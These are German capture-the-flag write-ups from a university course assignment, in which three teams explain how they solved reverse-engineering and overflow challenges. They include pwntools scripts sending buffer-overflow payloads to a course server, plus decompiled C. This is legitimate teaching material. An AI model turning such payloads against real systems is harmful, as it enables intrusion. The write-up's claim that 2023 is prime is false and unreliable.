
### Assignment 33 - Team 14
### Flag
```
FLAG{climbing_the_mountain}
```
```text
Beschreibung
Multistage Exploits..

```
Stufe 1:
```
Es wird nach der Faktorisierung von X * Y = 2023 gefragt, wobei X und Y eingegeben werden müssen. Natürlich kann man nicht einfach 1 und 2023 eingeben, wäre ja zu einfach. Es existiert keine weitere Faktorisierung, da 2023 eine Primzahl ist. Daher muss ein Integer-Overflow / Underflow verwendet werden.

Wir wählen:
4294967295 + 2004 = 4294969299 (2004 statt 2003, weil 0 existiert)

-> 10071 426469 (Primfaktorzerlegung..)
```
Stufe 2:
```
Normaler Check mit Bufferoverflow, eine Variable muss 0xdeadbeef sein. Wir müssen also 10 Zeichen eingeben und dann 0xdeadbeef im richtigen Encoding angeben (jetzt mal ernsthaft, wer kann denn bitte schon little endian auf den ersten Versuch richtig eingeben, danke dass ihr es printet).
```
Stufe 3:
```
Currenttime muss in Sekunden umgerechnet werden, dann ein bisschen geshiftet werden. Wir replizieren es lokal und geben den Wert ein. Hier war das Problem, dass die Serverzeit unterschiedlich ist, wodurch wir lokal das Offset bestimmen und dann schnell nochmal lösen (in der gleichen Sekunde).
Siehe Script.
```
```python
from pwn import *
import time

pty = process.PTY

# context.log_level = 'debug'
p = process("./team_14", stdin=pty, stdout=pty)
# p = remote("tank.informatik.hs-mannheim.de", 3114)

# prime factorization
p.sendlineafter(b"?", b"10071 426469")

# stufe 2
p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

# stufe 3
currtime = int(time.time())
currtime = currtime ^ (currtime >> 0xc)
currtime = currtime ^ (currtime << 0x19)
currtime = currtime ^ (currtime >> 0x1b)

p.sendlineafter(b"?", str.encode(str(currtime)))
```
Script angepasst damit es automatisch das server time offset crackt:
```python
from pwn import *
import time

pty = process.PTY

# context.log_level = 'debug'
# p = process("./team_14", stdin=pty, stdout=pty)

def crack(curr, goal):
    i = 0
    while True:
        tmp = curr + i
        tmp = tmp ^ (tmp >> 0xc)
        tmp = tmp ^ (tmp << 0x19)
        tmp = tmp ^ (tmp >> 0x1b)
        print(i, tmp, goal)
        if tmp == goal:
            return i

        tmp = curr - i
        tmp = tmp ^ (tmp >> 0xc)
        tmp = tmp ^ (tmp << 0x19)
        tmp = tmp ^ (tmp >> 0x1b)
        if tmp == goal:
            return -i

        i = i + 1

while True:
    p = remote("tank.informatik.hs-mannheim.de", 3114)

    # prime factorization
    p.sendlineafter(b"?", b"10071 426469")

    # stufe 2
    p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

    # stufe 3
    currtime = int(time.time()) # server time..
    tmp = currtime
    currtime = currtime ^ (currtime >> 0xc)
    currtime = currtime ^ (currtime << 0x19)
    currtime = currtime ^ (currtime >> 0x1b)

    p.sendlineafter(b"?", str.encode(str(currtime)))
    p.recvuntil(b"an ")
    goaltime = p.recvall().decode()[:-1]
    timeoffset = crack(tmp, int(goaltime[:-1]))

    # clean coding bla bla bla
    p = remote("tank.informatik.hs-mannheim.de", 3114)

    # prime factorization
    p.sendlineafter(b"?", b"10071 426469")

    # stufe 2
    p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

    # stufe 3
    currtime = int(time.time()) + timeoffset # server time..
    print("New time", currtime)
    currtime = currtime ^ (currtime >> 0xc)
    currtime = currtime ^ (currtime << 0x19)
    currtime = currtime ^ (currtime >> 0x1b)

    p.sendlineafter(b"?", str.encode(str(currtime)))
    flag = p.recvall().decode()
    print(flag)

    if "FLAG{" in flag:
        break
```
### Aufgabe 033 - Team 13
```
Beschreibung
Schritt 1:
Einfach das, was an der Wand steht, mit "brainbrainbrain" xor'en, Ergebnis: xorgenius!

Schritt 2:
Benutzername und Passwort stehen in der jeweiligen Methode als Hexadezimalcode, Benutzername = Dev, Passwort = 1337 ABER

Schritt 3:
Es wird eine andere Variable benutzt --> ein Bufferoverflow wird bei einem der Eingaben benötigt.
Da der Benutzername komplett egal ist, muss das Passwort gefälscht werden.

Dabei fällt auf, dass die ersten drei Zeichen als Benutzername genommen werden müssen (muss Dev sein), dann muss der Stack mit 8 Zeichen überbrückt werden und der Wert 1337 im Speicher abgelegt werden.

Benutzername: egal
Passwort: DevAAAAAAAA1337

(oder irgendein beliebiges Zeichen statt A)

Anschließend erhalten wir die Flagge.

Bestätigung des Passworts nicht mit ENTER, SONDERN MIT CTRL + D!!
FLAG{FLAG{FLAG{FLAG{FLAG}}}}
```
```
# Assignment 33 - Team 09

 
## Beschreibung  
Ich habe ehrlich gesagt keine Ahnung was dieses brainfuck interpreter ding in der encrypt() machen soll.
 
```c
undefined8 main(void)
 
{
  int cmpresult;
  size_t keylength;
  long in_FS_OFFSET;
  undefined key [4];
  int local_60;
  int local_5c;
  void *someBuff;
  undefined2 magic;
  undefined local_49;
  undefined userInput [40];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_60 = 0x13;
  keylength = strlen(::key);
  local_5c = (int)keylength;
  someBuff = malloc(0x13);
  magic = 0x7266;
  local_49 = 0x70;
  memset(userInput,0,0x20);
  printf("Enter message: ");
  __isoc99_scanf(&readString,userInput);
  printf("Enter key: ");
  __isoc99_scanf(&readDouble,key);
  keylength = strlen((char *)&magic);
  encrypt((char *)&magic,(int)keylength);
  cmpresult = strcmp((char *)&magic,"secure");
  if (cmpresult == 0) {
    xor_crypt(someBuff,crypt,(long)local_60,::key,(long)local_5c);
    print_array(someBuff,(long)local_60);
  }
  else {
    puts("Done.");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
 
magic und local haben den String "frp" (fr + p), die Nutzereingabe wird an diesen angehängt in der encrypt-Funktion. Dort wird weiter der String mit einer caesar-Ciphre verschlüsselt (Shift 13). Unser Ziel ist es, dass die Nutzereingabe mit frp das Wort "secure" ergibt. Dies ist möglich, da "frp" um 13 verschoben "sec" ist, wir müssen also nur noch "ure" einfügen. Dafür verschieben wir das ganze auch um 13 (DoppelROT13) und erhalten "her".
 
Nach der Eingabe:  
```bash
./team_09
Enter message: her
Enter key: 13
FLAG{the_real_flag}
```
 
erhalten wir die Flag.
## Flag  
FLAG{LuckyNumberSlevin}
```





